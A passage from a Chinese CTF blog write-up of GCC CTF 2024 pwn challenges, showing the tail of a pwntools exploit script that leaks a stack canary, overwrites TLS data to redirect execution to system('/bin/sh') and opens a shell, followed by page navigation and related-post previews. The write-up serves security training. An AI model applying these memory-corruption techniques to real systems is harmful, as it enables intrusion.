<span class="n">bin_sh</span>  <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nf">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="sh">'</span><span class="p">))</span>

<span class="n">pay</span> <span class="o">=</span> <span class="mh">0xbf8</span> <span class="o">*</span> <span class="sa">b</span><span class="sh">'</span><span class="s">C</span><span class="sh">'</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span>
<span class="nf">sp</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
<span class="n">canary</span> <span class="o">=</span> <span class="nf">uu64</span><span class="p">(</span><span class="nf">r</span><span class="p">(</span><span class="mi">7</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span>
<span class="n">rand</span>   <span class="o">=</span> <span class="nf">uu64</span><span class="p">(</span><span class="nf">r</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>


<span class="k">def</span> <span class="nf">rol</span><span class="p">(</span><span class="n">num</span><span class="p">,</span><span class="n">i</span><span class="p">):</span>
    <span class="n">part1</span> <span class="o">=</span> <span class="n">num</span> <span class="o">&lt;&lt;</span> <span class="n">i</span>
    <span class="n">part1</span> <span class="o">&amp;=</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">64</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span>
    <span class="n">part2</span> <span class="o">=</span> <span class="n">num</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">64</span> <span class="o">-</span> <span class="n">i</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">part1</span> <span class="o">+</span> <span class="n">part2</span>

<span class="c1"># 0xbd0
#&gt;&gt;&gt; hex(0xffffffffffffff90 - (1 &lt;&lt; 64))
# '-0x70'
</span><span class="n">pay</span> <span class="o">=</span> <span class="mh">0xa</span> <span class="o">*</span> <span class="nf">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">=</span> <span class="n">pay</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0xbd0</span><span class="o">-</span><span class="mh">0x70</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">tls_base</span><span class="o">-</span><span class="mh">0x70</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="nf">rol</span><span class="p">(</span><span class="n">system</span><span class="p">,</span><span class="mh">0x11</span><span class="p">))</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
<span class="n">pay</span>  <span class="o">=</span> <span class="n">pay</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0xbd0</span><span class="o">+</span><span class="mh">0x10</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span> <span class="c1"># mov rax,qword ptr fs:[0x10]
</span><span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">tls_base</span><span class="p">)</span> <span class="c1">#
</span><span class="n">pay</span>  <span class="o">=</span> <span class="n">pay</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0xbd0</span><span class="o">+</span><span class="mh">0x30</span><span class="o">+</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">sp</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>



<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">tls_base</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">libc_base</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">canary</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">rand</span><span class="sh">'</span><span class="p">)</span>
<span class="c1">#gdb.attach(io,gdbscript)
</span>
<span class="nf">s_exit</span><span class="p">()</span>
<span class="nf">itr</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240307201819-wd39hyd.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240307201819-wd39hyd.png" alt="image" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240307201839-68qs39r.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240307201839-68qs39r.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/ctf/">CTF</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/ctf/"
            class="post-tag no-text-decoration"
          >CTF</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          本文由作者按照 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         进行授权
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">分享</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FGCC-CTF%2F&title=2024-03-05-GCC-CTF-Pwn_Writeups%20-%20imLZH1'%20Blog" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="QQ" aria-label="QQ">
        <i class="fa-fw fa-brands fa-qq"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=2024-03-05-GCC-CTF-Pwn_Writeups%20-%20imLZH1'%20Blog&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FGCC-CTF%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FGCC-CTF%2F&text=2024-03-05-GCC-CTF-Pwn_Writeups%20-%20imLZH1'%20Blog" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="分享链接"
      data-title-succeed="链接已复制！"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">最近更新</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9B-Pwn-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/">第八届西湖论剑-网络攻防实战赛初赛-Pwn-解题思路</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/BRISC-CTF/">2024-BRISC-CTF-Pwn-WriteUps</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/">IrisCTF2025-Pwn-Binary-Exploitation-WriteUps</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/PHP-So-Pwn/">2024-05-31-PHP-So-Pwn</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/GCC-CTF/">2024-03-05-GCC-CTF-Pwn_Writeups</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">热门标签</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a>
      
    </div>
  </section>


            </div>

            
              
              



  <section id="toc-wrapper" class="ps-0 pe-4">
    <h2 class="panel-heading ps-3 pt-2 mb-2">文章内容</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->














  

  

  

  

  

  

  

  
    
  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  











  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">相关文章</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/2023%E4%B8%80%E5%B8%A6%E4%B8%80%E8%B7%AF%E6%9A%A8%E9%87%91%E7%A0%96%E5%9B%BD%E5%AE%B6%E6%8A%80%E8%83%BD%E5%8F%91%E5%B1%95%E4%B8%8E%E6%8A%80%E6%9C%AF%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E4%B9%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9C%A8%E4%BC%81%E4%B8%9A%E4%BF%A1%E6%81%AF%E7%AE%A1%E7%90%86%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8-Pwn-WriteUps/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1700395200"
  data-df="YYYY/MM/DD"
  
>
  2023/11/19
</time>

              <h4 class="pt-0 my-2">2023一带一路暨金砖国家技能发展与技术创新大赛之网络安全在企业信息管理中的应用-Pwn-WriteUps</h4>
              <div class="text-muted">
                <p>
                  





                  ‍
‍

‍

pwn-pwn0402

‍

​​​​

‍


  我们采用溢出后再次read  然后写shellcode 在栈上ret


‍

​​

‍

​​

from pwn import *
s       = lambda data               :io.send(data)
sa      = lambda delim,data         :io.s...
                </p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/2023%E9%A6%99%E5%B1%B1%E6%9D%AF%E5%86%B3%E8%B5%9BPwn-%E5%88%86%E6%9E%90/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1700481600"
  data-df="YYYY/MM/DD"
  
>
  2023/11/20
</time>

              <h4 class="pt-0 my-2">2023香山杯决赛Pwn-分析</h4>
              <div class="text-muted">
                <p>
                  





                  
  进决赛了，但是和金砖的比赛冲突了决赛没时间去了呜呜呜😭😭😭，选择去打金砖了，好打一点。


camera

‍

程序分析

‍

​​

‍

根据程序的功能然后加上一些手法，可以double free

后面就是填满 tcachebins 然后 fastbin double free 就好了

‍

​​

‍

‍

cat 用的顺手了，我就直接用 cat  ORW 就好了

​...
                </p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-%E8%B6%8A%E8%89%B0%E5%B7%A8-%E8%B6%8A%E7%8B%82%E7%83%AD-pwn-Writeups/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1700913600"
  data-df="YYYY/MM/DD"
  
>
  2023/11/25
</time>

              <h4 class="pt-0 my-2">2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups</h4>
              <div class="text-muted">
                <p>
                  





                  ‍

‍
DASCTF X CBCTF 2023｜无畏者先行

‍

‍

Pwn-ASadStory

‍


  保护


​​


  沙箱


​​

‍


  exploit


from pwn import *
s       = lambda data               :io.send(data)
sa      = lambda delim,data     ...
                </p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/SICTF-Round-3-WriteUps_by_AhiSec/"
      class="btn btn-outline-primary"
      aria-label="上一篇"
    >
      <p>2024-SICTF Round#3-WriteUps_by_AhiSec</p>
    </a>
  

  
    <a
      href="/posts/PHP-So-Pwn/"
      class="btn btn-outline-primary"
      aria-label="下一篇"
    >
      <p>2024-05-31-PHP-So-Pwn</p>
    </a>
  
</nav>

            
              
              <!--  The comments switcher -->

  
  <!-- https://giscus.app/ -->
<script type="text/javascript">
  (function () {
    const origin = 'https://giscus.app';
    const iframe = 'iframe.giscus-frame';
    const lightTheme = 'light';
    const darkTheme = 'dark_dimmed';

    let initTheme = lightTheme;
    const html = document.documentElement;

    if (
      (html.hasAttribute('data-mode') &&
        html.getAttribute('data-mode') === 'dark') ||
      (!html.hasAttribute('data-mode') &&
        window.matchMedia('(prefers-color-scheme: dark)').matches)
    ) {
      initTheme = darkTheme;
    }

    let giscusAttributes = {
      src: 'https://giscus.app/client.js',
      'data-repo': 'imLZH1/me_giscus_Discussions-',
      'data-repo-id': 'comments',
      'data-category': 'general',
      'data-category-id': '',
      'data-mapping': 'pathname',
      'data-reactions-enabled': '1',
      'data-emit-metadata': '0',
      'data-theme': initTheme,
      'data-input-position': 'bottom',
      'data-lang': 'zh-CN',
      'data-loading': 'lazy',
      crossorigin: 'anonymous',
      async: ''
    };

    let giscusScript = document.createElement('script');
    Object.entries(giscusAttributes).forEach(([key, value]) =>
      giscusScript.setAttribute(key, value)
    );
    document.getElementById('tail-wrapper').appendChild(giscusScript);

    addEventListener('message', (event) => {
      if (
        event.source === window &&
        event.data &&
        event.data.direction === ModeToggle.ID
      ) {
        /* global theme mode changed */
        const mode = event.data.message;
        const theme = mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme;

        const message = {
          setConfig: {
            theme: theme
          }
        };

        const giscus = document.querySelector(iframe).contentWindow;
        giscus.postMessage({ giscus: message }, origin);
      }
    });
  })();
</script>



            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>
    ©
    <time>2025</time>
    <a href="https://user.qzone.qq.com/3461665835">imLZH1</a>.
    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="除非另有说明，本网站上的博客文章均由作者按照知识共享署名 4.0 国际 (CC BY 4.0) 许可协议进行授权。"
      >保留部分权利。</span>
    
  </p>
	<span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>

  <p>本站采用 <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> 主题 <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">热门标签</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">发现新版本的内容。</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      更新
    </button>
  </div>
</aside>

    

    <!-- JavaScripts -->

    <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    <script src="/assets/lib/jquery/jquery.min.js"></script>
  

  
    <script src="/assets/lib/bootstrap/bootstrap.bundle.min.js"></script>
  

  
    <script src="/assets/lib/simple-jekyll-search/simple-jekyll-search.min.js"></script>
  

  
    <script src="/assets/lib/loading-attribute-polyfill/loading-attribute-polyfill.umd.min.js"></script>
  

  
    <script src="/assets/lib/magnific-popup/jquery.magnific-popup.min.js"></script>
  

  
    <script src="/assets/lib/clipboard/clipboard.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/dayjs.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/locale/en.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/plugin/relativeTime.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/plugin/localizedFormat.min.js"></script>
  

  
    <script src="/assets/lib/tocbot/tocbot.min.js"></script>
  








<script defer src="/assets/js/dist/post.min.js"></script>






    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  /* Note: dependent library will be loaded in `js-selector.html` */
  SimpleJekyllSearch({
    searchInput: document.getElementById('search-input'),
    resultsContainer: document.getElementById('search-results'),
    json: '/assets/js/data/search.json',
    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
    noResultsText: '<p class="mt-5"></p>',
    templateMiddleware: function(prop, value, template) {
      if (prop === 'categories') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
        }
      }

      if (prop === 'tags') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
        }
      }
    }
  });
</script>

  </body>
</html>

